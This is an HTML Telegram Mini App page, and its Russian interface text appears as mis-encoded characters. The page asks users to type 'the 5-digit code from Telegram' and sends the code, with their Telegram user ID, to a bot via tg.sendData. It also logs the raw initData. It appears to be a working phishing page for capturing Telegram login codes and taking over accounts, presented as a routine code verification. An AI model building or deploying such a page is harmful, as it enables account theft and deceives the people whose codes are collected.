<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∫–æ–¥–∞</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2a 100%);
            min-height: 100vh;
            color: #fff;
            padding: 20px;
        }
        .container { max-width: 400px; margin: 0 auto; padding-top: 40px; }
        .header { text-align: center; margin-bottom: 40px; }
        .logo { font-size: 48px; margin-bottom: 20px; text-shadow: 0 0 20px #9d00ff; }
        .title { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
        .subtitle { font-size: 15px; color: #b8b8b8; margin-bottom: 30px; }
        .code-container {
            display: flex; justify-content: center; gap: 12px;
            margin: 40px 0; padding: 0 20px;
        }
        .code-input {
            width: 56px; height: 68px;
            border: 2px solid rgba(157, 0, 255, 0.3);
            border-radius: 16px;
            background: rgba(30, 30, 40, 0.8);
            color: #fff;
            font-size: 32px; font-weight: 700;
            text-align: center; outline: none;
            transition: all 0.3s ease;
        }
        .code-input:focus {
            border-color: #9d00ff;
            box-shadow: 0 0 0 2px rgba(157, 0, 255, 0.3);
        }
        .button {
            width: 100%; height: 56px;
            background: linear-gradient(135deg, #9d00ff 0%, #6a00cc 100%);
            border: none; border-radius: 16px;
            color: white; font-size: 17px; font-weight: 600;
            cursor: pointer; transition: all 0.3s ease;
            margin-bottom: 20px;
        }
        .button:disabled {
            background: #5a5a5a;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">üîê</div>
            <h1 class="title">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∫–æ–¥–∞</h1>
            <p class="subtitle">–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –∏–∑ Telegram</p>
        </div>
        
        <div class="code-container">
            <input type="text" class="code-input" maxlength="1" data-index="0">
            <input type="text" class="code-input" maxlength="1" data-index="1">
            <input type="text" class="code-input" maxlength="1" data-index="2">
            <input type="text" class="code-input" maxlength="1" data-index="3">
            <input type="text" class="code-input" maxlength="1" data-index="4">
        </div>
        
        <button class="button" id="verifyButton" disabled>
            –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥
        </button>
        
        <div style="text-align: center; color: #888; font-size: 13px;">
            –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤—è—Ç—Å—è –≤ Telegram –±–æ—Ç–∞
        </div>
    </div>

    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
        let tg = window.Telegram.WebApp;
        
        // –†–∞—Å—à–∏—Ä—è–µ–º –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω –∏ –≤–∫–ª—é—á–∞–µ–º –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥
        tg.expand();
        tg.BackButton.show();
        tg.BackButton.onClick(() => {
            tg.close();
        });
        
        // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
        const codeInputs = document.querySelectorAll('.code-input');
        const verifyButton = document.getElementById('verifyButton');
        let currentCode = '';
        
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value.replace(/\D/g, '');
                e.target.value = value;
                
                if (value && index < 4) {
                    codeInputs[index + 1].focus();
                }
                
                updateCode();
                updateButtonState();
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    codeInputs[index - 1].focus();
                    codeInputs[index - 1].value = '';
                    updateCode();
                    updateButtonState();
                }
            });
        });
        
        // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –ø–µ—Ä–≤–æ–µ –ø–æ–ª–µ
        setTimeout(() => codeInputs[0].focus(), 300);
        
        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –∫–æ–¥–∞
        function updateCode() {
            currentCode = Array.from(codeInputs)
                .map(input => input.value)
                .join('');
            console.log('–¢–µ–∫—É—â–∏–π –∫–æ–¥:', currentCode);
        }
        
        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è –∫–Ω–æ–ø–∫–∏
        function updateButtonState() {
            verifyButton.disabled = currentCode.length !== 5;
        }
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–∫–∏
        verifyButton.addEventListener('click', () => {
            if (currentCode.length !== 5) return;
            
            console.log('–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ –≤ –±–æ—Ç–∞:', currentCode);
            
            // –ö–†–ò–¢–ò–ß–ï–°–ö–ò –í–ê–ñ–ù–û: –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ –±–æ—Ç–∞
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º tg.sendData() –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
            tg.sendData(JSON.stringify({
                action: 'verify_code',
                code: currentCode,
                user_id: tg.initDataUnsafe?.user?.id || 'unknown',
                timestamp: Date.now(),
                platform: 'mini_app'
            }));
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
            tg.showPopup({
                title: '‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω',
                message: '–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ –±–æ—Ç–∞. –ó–∞–∫—Ä–æ–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ.',
                buttons: [{ type: 'ok' }]
            });
            
            // –î–µ–∞–∫—Ç–∏–≤–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É
            verifyButton.disabled = true;
            verifyButton.textContent = '–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ ‚úì';
            
            // –ó–∞–∫—Ä—ã–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(() => {
                tg.close();
            }, 2000);
        });
        
        // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
        console.log('Mini App –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω');
        console.log('User data:', tg.initDataUnsafe?.user);
        console.log('Init data:', tg.initData);
        
    </script>
</body>
</html>
